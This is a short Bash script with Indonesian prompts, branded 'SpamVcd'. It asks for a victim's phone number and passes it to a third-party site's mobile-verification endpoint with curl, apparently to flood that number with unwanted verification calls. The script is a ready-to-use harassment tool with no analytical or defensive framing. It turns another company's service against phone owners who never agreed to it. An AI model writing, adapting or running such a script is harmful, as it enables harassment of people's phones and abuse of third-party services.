clear
sleep 1
echo
toilet  -f  big -F  gay  SpamVcd
echo $yellow"Halo kak selamat datang di script spam ini!"
echo
sleep 2
echo $green"Sihlakan pilih tools spamnya yaa :"
echo
echo $white"1.)  Spam Call"
echo
echo $yellow"2.) Keluar"
echo
echo $blue
read -p " Sihlakan pilih lurdnya ngab : " pil
if [[ $pil == 1 ]]; then
clear
toilet  -f  big  -F  gay  SpamVcd
echo $blue"Spam call"
read -p " Sihlakan masukan nomor yg ingin di isengin contoh 81211651261 : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
figlet  "Byee"
echo $white"Good byee"
sleep 3
exit
fi

